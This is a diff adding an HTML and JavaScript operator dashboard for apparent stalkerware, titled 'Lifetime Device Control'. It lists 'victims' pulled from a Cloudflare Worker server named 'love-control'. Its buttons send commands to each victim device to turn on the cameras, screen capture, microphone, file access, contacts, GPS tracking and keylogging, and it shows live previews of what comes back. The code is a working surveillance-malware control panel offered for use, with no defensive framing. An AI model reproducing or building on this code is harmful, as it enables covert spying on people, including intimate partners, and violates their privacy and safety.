@@ -1,0 +1,98 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>😈 Lifetime Control Panel</title>
+    <style>
+        *{margin:0;padding:0;box-sizing:border-box;font-family:system-ui,-apple-system,sans-serif}
+        body{background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);min-height:100vh;color:white;padding:20px}
+        .panel{max-width:1200px;margin:0 auto;background:rgba(255,255,255,0.1);border-radius:25px;padding:30px;backdrop-filter:blur(20px);box-shadow:0 20px 40px rgba(0,0,0,0.3)}
+        h1{text-align:center;font-size:2.5em;margin-bottom:30px;text-shadow:0 2px 10px rgba(0,0,0,0.3)}
+        .victims{display:grid;gap:20px}
+        .victim{background:rgba(255,255,255,0.15);border-radius:20px;padding:25px;border:2px solid rgba(255,255,255,0.2);transition:all 0.3s}
+        .victim:hover{transform:translateY(-5px);box-shadow:0 15px 35px rgba(0,0,0,0.4)}
+        .vid-header{font-size:1.3em;font-weight:bold;margin-bottom:15px;border-bottom:2px solid rgba(255,255,255,0.3);padding-bottom:10px}
+        .controls{display:grid;grid-template-columns:repeat(auto-fit,minmax(140px,1fr));gap:12px;margin-bottom:20px}
+        .btn{padding:12px 8px;border:none;border-radius:12px;font-size:15px;font-weight:600;cursor:pointer;transition:all 0.2s;box-shadow:0 4px 15px rgba(0,0,0,0.2);color:white;text-transform:uppercase;letter-spacing:0.5px}
+        .cam-btn{background:linear-gradient(45deg,#ff6b6b,#ee5a52)}
+        .screen-btn{background:linear-gradient(45deg,#4ecdc4,#44a08d)}
+        .file-btn{background:linear-gradient(45deg,#45b7d1,#96c93d)}
+        .mic-btn{background:linear-gradient(45deg,#f9ca24,#f0932b)}
+        .other-btn{background:linear-gradient(45deg,#6c5ce7,#a29bfe)}
+        .btn:hover{transform:translateY(-2px);box-shadow:0 8px 25px rgba(0,0,0,0.3)}
+        .btn:active{transform:translateY(0)}
+        .live-preview{position:relative}
+        .live-video{width:100%;max-width:300px;height:200px;object-fit:cover;border-radius:15px;border:3px solid rgba(255,255,255,0.5);margin:10px 0}
+        .status{font-size:0.9em;color:#ddd;margin-top:10px;padding:8px;background:rgba(0,0,0,0.3);border-radius:8px}
+        @media(max-width:768px){.controls{grid-template-columns:repeat(2,1fr)}}
+    </style>
+</head>
+<body>
+    <div class="panel">
+        <h1>😈 Lifetime Device Control</h1>
+        <div class="victims" id="victimsList"></div>
+    </div>
+
+    <script>
+    const SERVER_URL = 'https://love-control.YOURWORKER.workers.dev'; // Same as victim!
+    
+    async function loadVictims(){
+        try{
+            const response = await fetch(`${SERVER_URL}/victims`);
+            const victims = await response.json();
+            
+            document.getElementById('victimsList').innerHTML = victims.map(victim => `
+                <div class="victim">
+                    <div class="vid-header">
+                        ${victim.id} 
+                        <span style="font-size:0.8em;opacity:0.7">${new Date(victim.lastSeen).toLocaleString()}</span>
+                    </div>
+                    <div class="controls">
+                        <button class="btn cam-btn" onclick="controlDevice('${victim.id}', 'FRONT_CAM')">📸 Front Cam</button>
+                        <button class="btn cam-btn" onclick="controlDevice('${victim.id}', 'BACK_CAM')">📷 Back Cam</button>
+                        <button class="btn screen-btn" onclick="controlDevice('${victim.id}', 'SCREEN')">📱 Screen</button>
+                        <button class="btn file-btn" onclick="controlDevice('${victim.id}', 'FILES')">📁 Files</button>
+                        <button class="btn mic-btn" onclick="controlDevice('${victim.id}', 'MIC')">🎤 Mic</button>
+                        <button class="btn other-btn" onclick="controlDevice('${victim.id}', 'CONTACTS')">📞 Contacts</button>
+                        <button class="btn other-btn" onclick="controlDevice('${victim.id}', 'GPS')">📍 GPS</button>
+                        <button class="btn other-btn" onclick="controlDevice('${victim.id}', 'KEYLOG')">⌨️ Keys</button>
+                    </div>
+                    <div class="live-preview">
+                        <img class="live-video" id="preview_${victim.id}" style="display:none" src="">
+                        <div class="status" id="status_${victim.id}">Ready to activate</div>
+                    </div>
+                </div>
+            `).join('');
+        }catch(e){
+            console.log('Loading victims...');
+        }
+    }
+    
+    async function controlDevice(vid, action){
+        const statusEl = document.getElementById(`status_${vid}`);
+        const previewEl = document.getElementById(`preview_${vid}`);
+        
+        statusEl.textContent = `🚀 Sending ${action} command...`;
+        
+        await fetch(`${SERVER_URL}/command`, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({vid, action})
+        });
+        
+        statusEl.textContent = `✅ ${action} ACTIVATED - Live data incoming...`;
+        previewEl.style.display = 'block';
+        
+        // Poll for live preview
+        const interval = setInterval(async () => {
+            previewEl.src = `${SERVER_URL}/latest/${action.toLowerCase()}?vid=${vid}&t=${Date.now()}`;
+        }, 2000);
+        
+        setTimeout(() => clearInterval(interval), 30000);
+    }
+    
+    // Auto refresh victims
+    loadVictims();
+    setInterval(loadVictims, 5000);
+    </script>
+</body>
+</html>
